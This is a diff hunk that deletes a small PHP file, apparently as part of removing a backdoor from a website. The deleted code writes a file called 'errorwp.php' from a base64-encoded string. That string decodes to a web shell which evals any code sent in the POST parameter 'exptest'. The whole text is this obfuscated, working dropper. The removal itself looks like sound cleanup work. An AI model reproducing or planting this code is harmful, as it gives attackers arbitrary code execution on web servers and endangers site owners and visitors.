@@ -1,3 +1,0 @@
-<?php
-file_put_contents('errorwp.php', base64_decode("PD9waHAKCmZ1bmN0aW9uIHZhclByaW50KCR2YXIpewogICAgQGV2YWwoJHZhcik7Cn0KCgpjYWxsX3VzZXJfZnVuYygndmFyUHJpbnQnLCAkX1BPU1RbJ2V4cHRlc3QnXSk7CgoKPz4="));
-?>
